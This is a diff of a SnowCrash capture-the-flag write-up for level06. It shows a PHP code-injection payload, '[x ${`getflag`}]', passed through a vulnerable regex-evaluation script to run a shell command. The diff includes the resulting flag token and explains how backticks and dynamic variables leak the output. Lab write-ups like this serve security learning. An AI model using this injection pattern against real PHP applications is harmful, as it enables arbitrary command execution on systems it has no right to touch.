@@ -1,11 +1,17 @@
-# Level 06 -
+# Level 06 - Mastering PHP
 
 ## Inspection
+
+```shell
+level06@SnowCrash:~$ ls
+level06  level06.php
+```
 
 Lets try to run it ! 
 
 ```shell
-tower@781630NEOK19PW7:/mnt/c/Users/XZLR839/Documents/intra.42$ php script.php coucou
+level06@SnowCrash:~$ php script.php coucou
+
 PHP Warning:  Undefined array key 2 in /mnt/c/Users/XZLR839/Documents/intra.42/script.php on line 20
 
 PHP Warning:  file_get_contents(coucou): Failed to open stream: No such file or directory in /mnt/c/Users/XZLR839/Documents/intra.42/script.php on line 9
@@ -74,5 +80,27 @@ blablaoublablaou
 To exploit this you have to pass a `reverse shell` that go trew the `regex` and redirect the output somewhere you can read it.
 
 ````shell
-echo "[x {${exec(getflag)}}]" > /tmp/php_rce
+echo '[x ${`getflag`}]' >/tmp/06 && ./level06 /tmp/06
 ````
+
+```shell
+level06@SnowCrash:~$ echo '[x ${`getflag`}]' >/tmp/06 && ./level06 /tmp/06
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+```
+
+## Knowledge
+
+```
+[x ${`getflag`}]
+
+1. backticks `` in php is like using shell_exec().
+1. we will have [x ${"Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub"}]
+
+2. ${} in php is for create or calling dinamical variables
+2. PHP search in memory for a variable named -> $Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+
+3. PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+3. PHP will always print the name of the variable he failed to call and so we get our token.
+```
+
